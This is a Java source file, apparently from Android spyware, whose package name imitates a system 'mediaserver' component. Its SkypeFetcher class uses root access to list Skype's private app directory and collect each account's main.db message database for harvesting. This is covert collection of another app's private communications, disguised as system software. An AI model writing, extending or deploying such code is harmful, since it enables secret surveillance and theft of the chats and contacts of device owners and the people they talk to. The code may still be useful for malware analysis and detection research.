package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import com.android.mediaserver.shell.Shell.SU;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class SkypeFetcher extends FileFetcher {
  private final List<String> mDirsToExclude;

  public SkypeFetcher() {
    mDirsToExclude = Arrays.asList(new String[] { "DataRv", "RootTools", "shared_httpfe" });
    mFetchedFiles = new ArrayList();
  }

  public List<FetchedFile> fetch() {
    List<String> res = SU.run("ls -la /data/data/com.skype.raider/files/");
    if (res != null) {
      for (String dir : res) {
        if (true == dir.contains("drwx") && !dir.contains(".mdp")) {
          boolean isContainsData = true;
          for (String dirName : mDirsToExclude) {
            if (true == dir.contains(dirName)) {
              isContainsData = false;
              break;
            }
          }
          if (true == isContainsData) {
            String[] dirName2 = dir.split(" ");
            if (dirName2.length > 0) {
              mFetchedFiles.add(new FetchedFile(new File(
                  ("/data/data/com.skype.raider/files/" + dirName2[dirName2.length - 1] + "/")
                      + "main.db"), "APP", "skype"));
            }
          }
        }
      }
    }
    return mFetchedFiles;
  }
}
